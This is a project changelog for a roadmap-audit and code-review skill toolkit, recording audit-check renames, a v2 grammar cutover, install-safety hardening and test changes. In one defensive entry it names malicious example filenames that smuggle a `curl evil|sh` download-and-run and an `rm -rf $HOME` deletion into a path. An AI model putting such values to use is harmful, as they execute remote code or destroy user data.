# Changelog

All notable changes to this project will be documented in this file.

## [0.19.0.0] - 2026-05-10

### Changed (breaking): `/roadmap-new` cut over to `/roadmap`; v1 grammar dropped (Track 6D)

The v2 state-section model graduates from preview. `skills/roadmap-new.md` is renamed to `skills/roadmap.md` (the existing v1 skill is replaced wholesale), and v1 grammar is no longer accepted by the audit — `STATE_SECTIONS` now emits `MIGRATION_NEEDED: fail` (was `warn`) when a ROADMAP.md has no state sections. First `/roadmap` run on an existing v1 project will refuse to proceed without regenerating into the four state sections (`## In Progress` / `## Current Plan` / `## Future` / `## Shipped`); the regeneration preserves the Shipped region and re-emits everything else from inputs.

**Removed v1 audit primitives**, now unconditional/dropped:

- `serialize` and `hasPreflight` fields on `GroupInfo`. The `_serialize: true_` parsing block, the `**Pre-flight**` subsection parser, and the post-parse implicit-dep generation for serialized groups are gone. Sequential file work belongs in different Groups (or merged into one Track); shared-infra-before-parallel work belongs in a small earlier Group, not a sub-section of the same Group.
- The `if (hasV2Grammar)` gate around the intra-Group dep ban, PR-split ban, and Hotfix invariants in `src/audit/checks/structure.ts`. These are now unconditional structural checks.
- The Pre-flight-in-single-Track-Group warning from `src/audit/checks/style-lint.ts` (item 4).
- The `SERIALIZED_GROUPS:` note and `trackDependsOn(...)` dep-skip from `src/audit/checks/collisions.ts`. With the intra-Group dep ban now unconditional, there are no deps to skip.
- The `if (!hasV2Grammar)` skip path from `src/audit/checks/future.ts` — Future is now always validated.
- `PREFLIGHT_RE` regexes and the `'preflight'` section state from `src/audit/checks/task-list.ts` and `src/audit/checks/structural-fitness.ts`.
- The exported `trackDependsOn` helper from `src/audit/parsers/roadmap.ts` (no remaining callers after the collisions.ts strip).
- `bin/roadmap-revise` (split-track helper). The v2 regenerate-whole flow uses direct file writes; helper is unreachable.
- `lib/state.ts` `detectStateRegions()` simplification: any of the four state sections now triggers `kind: 'v2'` (previously `## Future` alone was treated as v1 to avoid ambiguity with v1 `## Future` content).
- Test fixture `tests/roadmap-audit/preflight-single-track/` (purely v1 Pre-flight test). All other v1-grammar fixtures gain a `## Current Plan` heading so `STATE_SECTIONS` passes; their underlying Group/Track shape exercises checks that still apply.

**Setup, tests, and docs:**

- `setup` SKILLS array drops `roadmap-new`. `tests/update.test.ts` `REAL_SETUP_SKILLS` constant updated. "Installed N skills" assertions updated 6 → 5.
- `tests/parsers-roadmap.test.ts` drops the `trackDependsOn` import and its 4-test describe block.
- `tests/skill-protocols.test.ts` drops the `BLOCK_ROADMAP_FAST_PATH` verbatim block (the v1 fast-path output `Plan looks current. No changes.` no longer exists; the v2 model regenerates on every substantive run).
- 5 mock `GroupInfo` fixtures (`tests/check-phases.test.ts`, `tests/check-group-deps.test.ts`, `tests/check-phase-invariants.test.ts`, `tests/lib-in-flight.test.ts`, `tests/helpers/audit-ctx.ts`) drop the `serialize: false` / `hasPreflight: false` fields.
- 27 `expected.txt` snapshots regenerated mechanically (`STATE_SECTIONS: warn` → `pass`, `FUTURE: skip` → `pass`).
- `docs/designs/roadmap-v2-migration-plan.md` deleted (this PR completed the migration).
- `docs/designs/roadmap-v2-state-model.md` retained as the living spec for the model.
- `docs/ROADMAP.md`: Group 6 Tracks 6A and 6C marked `✓ Shipped` inline; new Track 6D records this cutover.

**Known stale corpus item:** `tests/fixtures/skill-prose-corpus/1-roadmap-reassessment.md` was calibrated on v1 surgical-reassessment voice. It still works as clarity/completeness/actionability calibration but no longer reflects the regeneration-shaped output the new skill produces. Will be regenerated from a real `/roadmap` run when one is captured.

**Consumer migration:** projects with v1 ROADMAP.md (managua, bolt, etc.) hit `MIGRATION_NEEDED: fail` on first `/roadmap` invocation after upgrading and must regenerate to v2 grammar before any other audit work proceeds. This repo's own `docs/ROADMAP.md` is already v2 and audits clean.

## [0.18.19.0] - 2026-05-10

### Changed: STALENESS section renamed to VERSION_TAG_STALENESS + STATUS bug fix (Track 6A)

`/roadmap` audit now emits `## VERSION_TAG_STALENESS` instead of `## STALENESS`. The check only ever fired on items with explicit `(shipped vN.N.N)` annotations — broader recency lives in the `signals.git_inferred_freshness` field of `--scan-state`. The old name read as "is the plan stale?" when it actually meant "is a version-tagged completed item still in the active plan?" — the rename closes a dogfood-noted misread that `STALENESS: pass` settled the freshness question.

The check's STATUS also flipped from `fail` → `warn`. Skill prose has always classified this section as advisory (alongside TAXONOMY, SIZE_LABEL_MISMATCH); the code returning `fail` was elevating it to blocker rollups against the documented contract. Reconciled in the same PR as the rename.

### Changed (breaking, internal): scan-state JSON key renamed

`signals.staleness_fail` → `signals.version_tag_staleness_fail` in `bin/roadmap-audit --scan-state` output. Atomic rename — no deprecation window. Internal contract: the only known consumer is the `/roadmap` skill dispatcher (`skills/roadmap.md`), which is updated in the same PR. A new schema-pinning assertion in `tests/audit-cli-contract.test.ts` guards against future renames going silent on either side.

Internals also renamed: `src/audit/checks/staleness.ts` → `version-tag-staleness.ts`, `runCheckStaleness` → `runCheckVersionTagStaleness`. Skill prose updated in both `skills/roadmap.md` (5 refs + clarifier + drive-by `PARALLELIZABLE_FUTURE` → `FUTURE` typo fix) and `skills/roadmap-new.md` (2 refs).

### Added: Direct unit tests for `check_phases`, `check_phase_invariants`, `check_vocab_lint` (Track 6A)

Three new test files (`tests/check-phases.test.ts`, `tests/check-phase-invariants.test.ts`, `tests/check-vocab-lint.test.ts`) pin each branch of these state-machine checks. Snapshot fixtures still cover the end-to-end pipeline; these unit tests pinpoint a state-machine regression to a single rule instead of cascading across 8 fixtures.

New `tests/helpers/audit-ctx.ts` extracts the `makeCtx`/`stubGit` builders previously inlined in `tests/check-staleness.test.ts` (now `check-version-tag-staleness.test.ts`). Override-based factory pattern: every required AuditCtx field has a default, callers pass only what they exercise. Saves the next AuditCtx-shape change from a 3-site update.

## [0.18.18.0] - 2026-05-10

### Added: Track 6B — Track 5A test follow-ups

Closes two test-coverage gaps surfaced during /ship of v0.18.14.0.

- **Post-upgrade path-1 resolution integration test** in `tests/update.test.ts`. New opt-in fixture variant `createFixtureRepoWithRealSetup` copies the real `setup` + `bin/lib/install-safety.sh` + empty placeholder skill `.md` files into a fixture repo so `update-run`'s post-pull `setup` invocation actually rebuilds `~/.claude/skills/{name}/SKILL.md` symlinks. Four assertions after `update-run` completes: `UPGRADE_OK` fires, path-1 holds a symlink, the symlink target resolves into the fixture (not ROOT — proves no developer-home leakage), and the CP#3 readlink-chain probe yields `$_EXTEND_ROOT` = fixture root. Bash probe runs with scoped `env: { HOME, PATH }` only (no `process.env` spread) and `cwd: homeDir`, so the test cannot pass for the wrong reason via inherited developer env or a stale workspace-local `.claude/` directory. Probe also asserts exit 0 + non-empty stdout to defend against the failure mode where `set -u` + command substitution silently produces an empty `$_SKILL_SRC`.

- **Doc-type math boundary tests** in `tests/checks-doc-type.test.ts`. Five new tests pin the heuristic at its actual decision boundaries: empty file (0 content lines, skip), 4 content lines all checkboxes (under `MIN_CONTENT_LINES`, skip), density 0.4 (4/10, below `>=` 0.5 threshold, skip), density 0.5 EXACTLY (5/10, fires per `>=`), density 0.6 (6/10, fires). Fixtures use 10-line content so 4/10·5/10·6/10 land at the 0.4·0.5·0.6 boundary cleanly — a 5-line denominator can only produce {0, 0.2, 0.4, 0.6, 0.8, 1.0}, which misses 0.5 entirely.

### Changed: cache-clear assertions in update-run happy-path test now seeded

The existing happy-path test now pre-seeds `last-update-check` and `update-snoozed` in `stateDir` before invoking `update-run`, then asserts both files are removed. Previously the implicit `existsSync(...).toBe(false)` would have passed even if `update-run` did nothing (the files never existed to begin with).

### Changed: plantuml fence test pins `mkdir -p` prefix

The existing plantuml-fence design-mismatch test now asserts `mkdir -p 'docs/designs' && ` appears in the suggestion. Previously the test only matched the destination filename, so removing the `mkdir -p` branch from `suggestionFor` would have left the test green.

## [0.18.17.0] - 2026-05-10

### Added: `/roadmap-new` Group/Track ID-renames mapping at apply time

When `/roadmap-new` regenerates and renumbers (old Group 7→6, old Group 12 splitting into 13/14/15, etc.), the apply summary and commit message body now include a one-table mapping of every renamed Group/Track that kept its title. Closes the cognitive gap where users anchored on volatile IDs ("I was working on Track 9A") had to re-derive the new ID manually.

New helper at `src/audit/lib/renames-diff.ts` — three pure functions: `parseEntities` extracts `(id, kind, title)` tuples from any ROADMAP.md, `computeRenames` matches by exact normalized title (whitespace-collapsed, lowercased, with `Hotfix:` prefix and `✓ Shipped (vX.Y.Z)` suffix stripped) and emits same-title-different-ID pairs, `formatRenamesTable` renders the markdown table. Group and Track namespaces are kept separate — a Group titled "Foo" doesn't match a Track titled "Foo". 15 unit tests in `tests/lib-renames-diff.test.ts` cover normalization, parsing across heading depths, namespace separation, ✓ Shipped suffix changes, and multi-rename scenarios.

### Changed: ROADMAP.md migrated to v2 state-section grammar

The first dogfood run of `/roadmap-new` on this repo's own ROADMAP. Phase 1 (Groups 1–4) and Group 5 (Install Pipeline) preserved verbatim under `## Shipped` with frozen IDs. Upcoming plan regenerated from scratch driven by the file-collision matrix: 10 Groups, 14 Tracks, with the four skill-trim Tracks (14A–14D) running fully in parallel. TODOS.md inbox drained — three legacy bullet entries reformatted: 2 `[ship]` follow-up tests promoted into a new parallel Track 6B; 1 `[ceo-review]` Project Bootstrapping item promoted into Groups 8 + 9 (split because audit-init-subcommand and the gstack-extend-init wrapper have a hard serial dep).

### Changed: `/roadmap-new` skill refactor — cut overhead from dogfood feedback

After the first end-to-end run, three layers of overhead got cut from the skill prose:

- **Step 2 fast-path predicate deleted.** Predicate was so narrow (audit clean + empty inbox + no freshness + no prompt cue + already-v2) that it almost never fired. Always regenerate; the no-op proposal handles the clean case naturally without dedicated bypass.
- **Top-of-run Phase-context hint branches deleted.** Pre-shipping context lines that printed when a Phase was in flight or closing. `/ship` owns version recommendations — `/roadmap-new` doesn't predict.
- **`--scan-state` invocation removed from Step 1.** The JSON envelope drove zero decisions in the first dogfood run; intent parsing belongs in the LLM. v1 `/roadmap` keeps using `--scan-state` (helper preserved in `src/audit/cli.ts`); v2 reads audit + TODOS + git directly.

### Changed: `/roadmap-new` Step 5 PROGRESS.md flow honors documentation taxonomy

Replaces direct row-write with detect-staleness → AskUserQuestion → optional scoped general-purpose subagent appends rows from CHANGELOG. Project taxonomy assigns PROGRESS.md content to `/document-release`; `/roadmap-new` only owns structure. The new flow respects that boundary without invoking the full `/document-release` skill (which has broader scope and would clash with the inbox drain `/roadmap-new` just performed).

### Fixed: restore `--scan-state` after Codex caught v1 `/roadmap` regression

Initial Track 6C cut deleted `--scan-state` from `src/audit/cli.ts` based on the dogfood finding that `/roadmap-new` doesn't use it. Codex adversarial review caught that v1 `/roadmap` (skills/roadmap.md:80) STILL invokes `--scan-state` and parses the JSON output. Removing the helper would have silently broken v1: the flag would parse as a positional repo-root argument and the JSON read would corrupt v1's intent/signal extraction. Restored `runScanState`, `computeGitInferredFreshness`, intent helpers, dispatch, two scan-state fixtures, cli-contract test assertions, and the audit-invariants filter. v2 `/roadmap-new` skill prose still doesn't invoke the helper.

## [0.18.16.2] - 2026-05-10

### Changed: `/roadmap-new` makes file collisions drive Group structure, not validate it after

Step 3 of `/roadmap-new` now decomposes work into draft Tracks with `_touches:_`
footprints **before** assigning them to Groups. The pairwise file-set
intersection of those footprints becomes the grouping primitive: pairs with
empty intersection may co-Group, pairs with non-empty intersection must merge
into one Track or land in different Groups with a dep edge. Group naming and
themes decorate the resulting parallel-safety partition, not the other way
around.

The audit's COLLISIONS check (Step 4) is reframed as a drift safety net rather
than the primary parallel-safety check. A failure there now signals that the
matrix step was skipped or human edits introduced a collision, instead of being
the first place collisions get detected.

Prior behavior asked the LLM to "remember" parallel-safety while structuring,
then audited after writing — which let v1 "5 Tracks in Group N" parade as
parallel when 4 of them actually chained on shared files. The new ordering
forces the right outcome at structuring time.

Spec doc (`docs/designs/roadmap-v2-state-model.md`) is unchanged — it defines
the Group contract (set-disjoint touches), and the construction order belongs
in the skill prose.

## [0.18.16.1] - 2026-05-10

### Changed: `## Shipped` moves to the document tail in `/roadmap-new`

Section order in v2 ROADMAP.md flips from
`Shipped → In Progress → Current Plan → Future` to
`In Progress → Current Plan → Future → Shipped`. The active plan now sits at
the top of ROADMAP.md, and shipped history sinks to the tail — readers don't
scroll past completed work to see what's happening now and next.

The `STATE_SECTIONS` audit check enforces the new order. Existing v2 roadmaps
written under v0.18.16.0 will fail the order check until rerun through
`/roadmap-new`, which regenerates the full document in the new layout. v1
roadmaps (no state sections) are unaffected — they continue to emit
`MIGRATION_NEEDED: warn` only.

The Shipped grammar itself is unchanged: per-Track bullets with frozen IDs and
versions stay (they're the canonical Track-ID → version map the regenerator
anchors on, and CHANGELOG/PROGRESS don't carry that detail per Track).

## [0.18.16.0] - 2026-05-10

### Added: `/roadmap-new` skill (v2 preview, ships alongside `/roadmap`)

A new roadmap skill built around lifecycle-state sections and whole-plan
regeneration. Ships as `/roadmap-new` so the v1 `/roadmap` keeps working
unchanged — preview the new model on real projects, then migrate when ready.

The v2 model addresses four recurring pain points in v1:

- **Defer-by-default → one-by-one fallback.** v1 mass-recommended deferral when
  inbox items didn't fit existing Groups, then asked placement per item when
  the user pushed back. v2 regenerates the upcoming plan as one document — no
  per-item placement loop, no deferral batch. The whole plan is volatile each
  run.
- **Hotfix subsection misuse.** v1 routed any inbox item source-tagged to a
  shipped Group into that Group's `**Hotfix**` subsection, regardless of
  whether it was a real regression. v2 makes Hotfix a Group title prefix
  (`Hotfix:`) with single-Track invariants and a queue-jumping rule —
  deferred scope is just normal Current Plan work.
- **Sizing failure.** v1 Tracks routinely declared "Ship as N PRs" inline,
  evading the 300-LOC cap until CEO review caught it. v2 audit bans the PR-
  split language outright and treats the cap as a hard rule: 1 Track = 1 PR,
  always.
- **Illusory parallelization.** v1 audit's collision check skipped Track pairs
  joined by `_Depends on:_`, so a Group with 5 chained Tracks could parade as
  parallel-safe. v2 forbids intra-Group `_Depends on:_` between Tracks — if
  work needs serialization on shared files, it's either one Track or in
  different Groups.

### Added: state-section grammar

ROADMAP.md is organized at the top level by lifecycle state:

```
## Shipped         — completed work, IDs frozen forever
## In Progress     — Phase/Group mid-flight (some shipped Tracks, some not)
## Current Plan    — definitely doing this
## Future          — flat bullets only, not committed to
```

Tracks have no separate "in progress" state (they're 1 PR each; the branch-
open → PR-merge window is short). Groups/Phases are in-progress when at least
one Track has shipped and at least one hasn't.

### Added: regenerate-the-plan reassessment

Each `/roadmap-new` run treats the upcoming plan (`## In Progress` +
`## Current Plan` + `## Future`) as volatile and emits a complete new block
from inputs (TODOS.md inbox, git activity, leftover non-shipped work).
Shipped IDs are frozen; everything else can be renumbered. The proposal
artifact is the entire upcoming plan, reviewed as one document.

### Added: deferral protocol for `/plan-ceo-review` and `/plan-eng-review`

When in-scope work is cut from a Track during plan review, the deferred items
land in `TODOS.md ## Unprocessed` with `[plan-ceo-review:track=<id>,
defer=true]` or `[plan-eng-review:track=<id>,defer=true]` source tags. The
next `/roadmap-new` run picks them up and decides placement holistically.
Source-tag routing matrix updated so `defer=true` items KEEP automatically
and review findings without `defer=true` PROMPT.

### Added: `state-sections` and `future` audit checks

- `STATE_SECTIONS` validates the four state sections appear in the right order
  and at most once each. Emits `MIGRATION_NEEDED: warn` on v1-grammar input
  (advisory, non-blocking).
- `FUTURE` enforces that `## Future` contains only flat bullets in v2
  grammar — no Phase/Group/Track structure, no `_touches:_`, no sizing.
- v2-only enforcement (intra-Group `_Depends on:_` ban, "N PRs" language ban,
  Hotfix invariants) is gated on detected v2 grammar so v1 roadmaps stay
  byte-stable under `/roadmap`.

### Added: `docs/designs/roadmap-v2-state-model.md` and migration plan

Full grammar specification, primitive rules, ID stability, deferral protocol,
and out-of-scope future work. `roadmap-v2-migration-plan.md` is a 12-step
recipe for promoting `/roadmap-new` to `/roadmap` and retiring v1 once the
preview is proven.

### Removed: `parallelizable-future` audit check

Replaced by the simpler `FUTURE` check. v1 used to surface Future tracks
eligible for promotion to current Groups; v2 treats Future as flat bullets
only, so the lookup primitive doesn't apply.

## [0.18.15.0] - 2026-05-07

### Persist session state outside the Conductor workspace

`/pair-review`, `/full-review`, and `/roadmap` previously wrote session state
to `<workspace>/.context/<skill>/`. Conductor archives the workspace when work
merges to main, taking that state with it — so `/pair-review`'s advertised
"cross-machine resume" silently broke at the worst time (mid-test, post-merge,
across handoffs). Same latent bug in `/full-review` (multi-day triage) and
`/roadmap` (proposal audit trail).

Session state now lives at
`${GSTACK_STATE_ROOT:-$HOME/.gstack}/projects/<slug>/<skill>/`, mirroring
gstack core's `/context-save` checkpoints/ pattern. Survives Conductor
workspace archival; per-machine durable (cross-machine layer is delivered by
mind-meld, not this PR).

#### Added: `bin/lib/session-paths.sh`

Sourced bash helper exposing two echoing functions (matches `effort.sh`'s
idiom):

- `session_dir <skill>` → `${GSTACK_STATE_ROOT:-$HOME/.gstack}/projects/<slug>/<skill>`
- `session_archive_dir <skill> <ts>` → same with `-archived-<ts>` suffix

Slug resolution mirrors `~/.claude/skills/gstack/bin/gstack-slug` exactly:
try the binary, fall back to `basename "$PWD"` sanitized to `[a-zA-Z0-9._-]`.
Outside a git repo, slug becomes the cwd basename — never errors. A final
guard returns `unknown-project` if the basename is fully stripped.

`tests/lib-session-paths.test.ts` covers `session_dir`, `session_archive_dir`,
the `GSTACK_STATE_ROOT` override, the basename PWD fallback, character
sanitization, the `unknown-project` sentinel, and empty-arg errors. Pattern
matches `tests/lib-install-safety.test.ts`.

#### Changed: skill paths

- `skills/pair-review.md`: every `.context/pair-review/` reference replaced
  with `<SESSION_DIR>` (resolved via the helper). Active Session Guard's `mv`
  uses `session_archive_dir`. Path Resolution section added near the top of
  State Management explaining the bash block to run before any state-touching
  phase.
- `skills/full-review.md`: same treatment with `<SESSION_DIR>` resolved via
  `session_dir full-review`.
- `skills/roadmap.md`: proposal artifact moved from
  `.context/roadmap/proposal-{ts}.md` to `<PROPOSAL_DIR>/proposal-{ts}.md`
  where `<PROPOSAL_DIR>` = `~/.gstack/projects/<slug>/roadmap-proposals/`
  (flat, mirrors gstack's `checkpoints/` shape rather than nested
  `roadmap/proposals/`).
- `skills/test-plan.md`: Phase 4 (prior pair-review consumption) and Phase 7
  (state handoff) now write into pair-review's durable session dir. Archived
  sibling scan walks `${PROJECT_DIR}/pair-review-archived-*` rather than
  `.context/pair-review-archived-*`.
- `skills/review-apparatus.md`: detection probes for an existing pair-review
  session use `$(session_dir pair-review)/` rather than `.context/pair-review/`.

#### Migration

None. Sole-user repo; nothing to migrate. `.context/<skill>/` directories in
existing workspaces will be abandoned with the workspace at archival, which
is the same behavior the user already expected — they just couldn't get to
the state from a new workspace.

#### Tests

- New: `tests/lib-session-paths.test.ts` (10 tests).
- Updated: `tests/test-plan-e2e.test.ts` — fixture paths under
  `.gstack/projects/<fixture>/pair-review/` rather than `.context/pair-review/`.
  Behavior unchanged; fixtures now mirror production shape.
- Updated: `tests/skill-protocols.test.ts`:
  - `BLOCK_ROADMAP_PROPOSAL_PATH` now asserts `<PROPOSAL_DIR>/proposal-{ts}.md`.
  - New drift-lock describe: every affected skill must source
    `bin/lib/session-paths.sh`, must call `session_dir <name>` with the
    expected name, and must NOT contain a `.context/<skill>/` literal.

Full suite: 892 pass, 0 fail.

#### Removed

- `.context/` from `.gitignore` (nothing writes there anymore).

---

## [0.18.14.0] - 2026-05-06

### Track 5A — Install pipeline polish

Closes the v0.16.0 known-limitation gap where `--skills-dir <custom>` shipped
working symlink installs but skill preambles silently no-op'd helper
resolution. The fix was NOT to extend the env-var/RC-file hack the original
spec proposed, but to mirror gstack core's actual behavior: skill preambles
probe `~/.claude/skills/{name}/SKILL.md` then `.claude/skills/{name}/SKILL.md`
and stop. Anything beyond those two paths is unsupported.

#### Breaking change: `--skills-dir` retired for install

Running `./setup --skills-dir <path>` (without `--uninstall`) now exits 1 with
a migration message. Skill preambles only discover symlinks at the two probed
paths above, so symlinks at custom paths were never load-bearing — the v0.16.0
flag shipped a misleading capability. The flag is preserved ONLY when paired
with `--uninstall` as a one-way escape hatch for cleaning up v0.16.0-era
custom installs:

```sh
./setup --skills-dir <old-custom-dir> --uninstall
```

If you never used `--skills-dir`, this changes nothing for you.

#### Added: skill preamble path-2 fallthrough (vendored install support)

All 5 skill preambles (`pair-review`, `roadmap`, `full-review`,
`review-apparatus`, `test-plan`) now probe `~/.claude/skills/{name}/SKILL.md`
first, falling back to `.claude/skills/{name}/SKILL.md` (project-local
vendored install) on miss:

```bash
_SKILL_SRC=$(readlink ~/.claude/skills/{name}/SKILL.md 2>/dev/null \
           || readlink .claude/skills/{name}/SKILL.md 2>/dev/null)
```

Vendored installs at `<project-root>/.claude/skills/{name}/SKILL.md` MUST be
absolute symlinks for the `dirname dirname readlink` chain to resolve
`$_EXTEND_ROOT` correctly. `setup`'s install loop already creates absolute
symlinks (`SCRIPT_DIR` resolves via `pwd -P`). Manual relative-symlink drops
will silently fail — same constraint gstack core has.

`tests/skill-protocols.test.ts` now asserts the path-2 fallthrough line is
present in all 5 skill preambles, locking against future drift.

`skills/test-plan.md`'s Phase 8 inline-Read of `pair-review.md` was updated
to use the same two-path probe so vendored installs work end-to-end.

#### Added: install-time symlink hardening (defense in depth)

Two layers of new safety checks in `setup`:

1. **Install root** (`bin/lib/install-safety.sh:is_safe_install_path`) —
   resolves `$SKILLS_DIR` (or its nearest existing ancestor) and refuses
   install if the resolved target is foreign-owned (numeric uid mismatch),
   world-writable (`find -perm -o+w`), or outside the resolved `$HOME`
   (slash-delimited case match). Permits legitimate dotfiles/sync setups
   (Dropbox, chezmoi, GNU stow) where the user owns the resolved target.

2. **Per-target** (`bin/lib/install-safety.sh:is_safe_target_path`) —
   refuses install when `$SKILLS_DIR/{name}` is a symlink, regular file,
   FIFO, or any non-directory entry. Same check applies in the uninstall
   iteration for both `SKILLS` and `LEGACY_SKILLS=(browse-native)` paths.

Preflight: ALL targets are validated before ANY mutation. A failed safety
check on skill 3 cannot leave skills 1 and 2 in a partial-install state.

Cross-platform: numeric uid via `stat -f '%u'` (BSD) / `stat -c '%u'` (GNU);
ancestor walk handles non-existent install dirs that `setup` will create;
`cd -P && pwd -P` resolves symlinks portably.

#### Added: `DOC_TYPE_MISMATCH` audit check

New `src/audit/checks/doc-type.ts` emits warnings when a markdown file's
content disagrees with its location:

- **Design doc outside `docs/designs/`** — fenced code block with `mermaid`
  or `plantuml` language identifier.
- **Inbox doc outside `TODOS.md`** — checkbox density >= 0.50 (lines matching
  `^\s*[-*]\s*\[[ x]\]` divided by non-blank, non-heading content lines).
  Files with fewer than 5 content lines are skipped.

Each finding includes a copy-pasteable suggestion: `git mv -- <quoted-src>
<quoted-dst>` when destination is unambiguous, `mkdir -p <quoted-parent>
&& git mv -- ...` when parent dir doesn't exist yet, or `review and move
(no automated suggestion — destination ambiguous)` when the destination
collides.

Suggested commands single-quote every path via a POSIX-compliant
`shellQuote` helper and use the `--` end-of-options sentinel. Defends
against malicious filenames like `a;curl evil|sh.md` or `$(rm -rf $HOME)`
that would otherwise execute when a user copy-pastes the suggestion.
Codex ship review caught this as P0.

Inbox-mismatch destination resolution honors whichever location of
`TODOS.md` actually exists (root vs `docs/`) per the existing
`check_doc_location` `PROJECT_DOC_PAIRS` rule. If neither exists, defaults
to `docs/TODOS.md` (canonical). Avoids the bug where suggestions would
always emit `git mv X TODOS.md` at the repo root, creating a shadow file
that masks `docs/TODOS.md`.

Filename allowlist exempts known-checklist docs that legitimately have
checkbox density: `CONTRIBUTING.md`, `CODE_OF_CONDUCT.md`, `RUNBOOK.md`,
`SECURITY.md`, `SUPPORT.md`, `GOVERNANCE.md`, `*checklist*`. Existing
`ROOT_DOCS` and `DOCS_DIR_DOCS` (handled by `DOC_LOCATION`) are also skipped.

Inherits the existing `walkMdFiles` maxdepth-2 walk scope; deeper docs
(`docs/guides/foo.md`) are not scanned.

`DOC_TYPE_MISMATCH` is registered as a CANONICAL audit section adjacent to
`DOC_LOCATION` in `src/audit/sections.ts` — every `bin/roadmap-audit` run
emits the section (status `pass` with `(none)` when no mismatches found,
`warn` with findings + git-mv suggestions when content disagrees with
location). The 23 existing snapshot fixtures regenerated mechanically via
`UPDATE_SNAPSHOTS=1`. New fixture `tests/roadmap-audit/doc-type-mismatch/`
exercises both heuristics (mermaid fence + checkbox density) end-to-end.

#### Itemized changes

- New `bin/lib/install-safety.sh` — `is_safe_install_path` (resolved-path
  + ownership + world-writable + inside-$HOME) and `is_safe_target_path`
  (symlink + non-directory refusal).
- New `src/audit/checks/doc-type.ts` — DOC_TYPE_MISMATCH heuristic with
  filename allowlist + git-mv preview suggestions.
- New fixture `tests/roadmap-audit/doc-type-mismatch/` — positive case for
  both heuristics.
- New tests `tests/lib-install-safety.test.ts` — 15 unit tests for both
  helper functions via shell-out.
- `setup` — sources `bin/lib/install-safety.sh`; preflight-then-mutate
  install loop; `--skills-dir` rejection for install path; `USAGE` text
  refresh; uninstall path emits visible `Skipped <skill>` for symlinked
  or non-directory targets.
- `skills/{full-review,pair-review,review-apparatus,roadmap,test-plan}.md`
  — preamble probe gains path-2 fallthrough.
- `skills/test-plan.md` — Phase 8 inline-Read uses the same two-path probe.
- `src/audit/sections.ts` — `DOC_TYPE_MISMATCH` appended to
  `CANONICAL_SECTIONS` adjacent to `DOC_LOCATION`.
- `src/audit/cli.ts` — registers `runCheckDocType` in `ALL_CHECKS` adjacent
  to `runCheckDocLocation`.
- `tests/update.test.ts` — drops `--skills-dir` install cluster; adds
  `--skills-dir` install rejection test; adds D6 expanded coverage
  (world-writable, outside-$HOME, per-target symlink, regular file at
  target); adds CP#3 integration tests (default install + vendored
  fallthrough + truly-broken silent no-op); legacy `--skills-dir +
  --uninstall` cluster reseeded via `mkdirSync` + `symlinkSync` (no
  longer depends on the retired install path).
- `tests/skill-protocols.test.ts` — new `Track 5A two-path preamble probe`
  describe block asserting all 5 skills carry the path-2 fallthrough line.
- `tests/roadmap-audit/*/expected.txt` (23 fixtures) — regenerated to
  include the new `## DOC_TYPE_MISMATCH` section (status `pass` for all
  existing fixtures since none trip the heuristic).
- `README.md` — removes the v0.16.0 "Per-project installs (`--skills-dir`)"
  section + the known-limitation note pointing at this Track.

#### Migration

Anyone with v0.16.0-era custom installs at `<custom-path>/{skill}/SKILL.md`
should run:

```sh
./setup --skills-dir <custom-path> --uninstall
./setup
```

The first command cleans up orphan symlinks at the custom path; the second
installs to `~/.claude/skills/` where preambles will actually find them.

## [0.18.13.0] - 2026-05-05

### Added (auto-release on VERSION change)

`.github/workflows/auto-tag.yml` now creates a GitHub Release after pushing the
annotated tag. Release notes come from the matching `## [X.Y.Z]` section in
`CHANGELOG.md` via the new `scripts/extract-changelog-section.sh`. If the
section is missing, the workflow falls back to gh's `--generate-notes` (commit
list) and emits a `::warning::` so the gap is visible in the Actions log.

The new script is reusable: it accepts a version (no `v` prefix), prints the
section body to stdout, and falls back to a trailing-`.0` trim (e.g. `0.18.5.0`
finds `## [0.18.5]`) for older CHANGELOG entries that predate the 4-digit
format. Exits 1 with a stderr message if no section matches.

Backfill: every existing tag (53 total, `v0.1.1` through `v0.18.12.1`) now has
a corresponding GitHub Release. `v0.18.12.1` is marked as the latest release.
The two oldest tags (`v0.1.1`, `v0.1.2`) had no CHANGELOG entry and got a
placeholder note.

The release step is idempotent on both axes: re-running the workflow on an
unchanged commit skips both the tag (`git rev-parse "$TAG"`) and the release
(`gh release view "$TAG"`).

## [0.18.12.1] - 2026-05-05

### Docs (roadmap reassessment — Phase 1 closes)

`/roadmap` reassessment closes 8 items (Tracks 2A/3A/4A + Pre-flight 4A-audit + Groups 2/3/4 + Phase 1) that shipped in v0.18.6.0/0.18.7.0/0.18.9.0 but never got marked Complete in `docs/ROADMAP.md`. Phase 1 (Bun Test Migration) now reports `state=complete`. The next code-shipping `/ship` will recommend MINOR per the phase-aware default.

Triaged the 14 inbox items: 3 killed (slow tests resolved by Track 2B; `/full-review` on `scripts/` obsolete after Track 3A's bash-script deletion; `/test-plan` validation deprioritized post-Group-4), 1 deferred to Future (Codex host support — gates need re-measurement after the Track 12 simplification settles description lengths), and 10 promoted to Tracks across new active scope.

New active scope:
- **Track 5A** "Install pipeline polish" — folded the 3 Pre-flight items into a single 5-task Track per the single-Track Group rule, plus the `setup` symlink-component hardening surfaced during /review of Pre-flight 1.
- **Group 7: Audit Polish** — Track 7A with 3 tasks (direct phase-check tests, STALENESS rename, FRESHNESS scan extends to TODOS.md `## Unprocessed`).
- **Groups 8 → 12: Skill ecosystem polish chain** — sequentially-dependent so concurrency stays under the parallelism budget while preserving scope: 8A git commit failure handling (3 skills), 9A `/gstack-extend-upgrade` skill, 10A telemetry parity with gstack, 11A `/claude-md-cleanup` skill, 12A-12E skill-file simplification per-skill (parallel-safe within Group 12 after the Pre-flight canonical fragment extraction) plus SKILL.md.tmpl promotion.

Mechanical doc fixes: added metadata lines to ✓ Complete Tracks 1A/2B/4D so the audit's STRUCTURE check passes; archived `docs/designs/{bun-test-architecture,roadmap-phases}.md` (both reference shipped versions); deleted `docs/designs/group-4/` implementer plans per their own design (removed when Group 4 closes). Updated `tests/parsers-{phases,roadmap}.test.ts` real-ROADMAP assertions to reflect the new state (Phase 1 title, Track 2A complete, Group `_Depends on: none_` annotations parse as `kind: 'none'`).

Audit final state: STRUCTURE pass, PHASES pass + state=complete, COLLISIONS pass, GROUP_DEPS pass (12 groups), SIZE pass, PARALLELISM_BUDGET pass (3 in-flight vs cap 4), STYLE_LINT pass. VOCAB_LINT warns × 4 are legitimate body-prose references to "Phase 1" outside the Phase block (override per advisory rules). VERSION fail (0.18.12.0 vs latest tag v0.18.7.0) is git-tag drift from recent /ship runs without /land-and-deploy tagging — separate concern, unchanged by this commit.

## [0.18.12.0] - 2026-05-04

### Changed (install enforces bun)

